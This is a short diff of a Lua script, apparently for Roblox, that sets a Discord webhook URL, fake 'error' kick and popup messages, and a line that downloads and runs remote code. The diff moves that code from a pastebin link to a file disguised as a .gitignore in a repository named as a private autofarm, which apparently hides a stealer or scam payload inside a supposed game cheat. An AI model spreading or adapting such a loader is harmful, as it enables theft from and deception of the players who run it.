@@ -4,4 +4,4 @@ _G.Webhook = "https://discord.com/api/webhooks/1022912036885233725/Tm-SQS2_4fYu2
 _G.KickMessage = "There Was An Error Please Rejoin."
 _G.PopUpMessage = "Error Code 404"
 
-loadstring(game:HttpGet"https://pastebin.com/raw/APuHkcsM")()
+loadstring(game:HttpGet"https://raw.githubusercontent.com/senpaikun123431/Autofarm-Private-/main/.gitignore")()
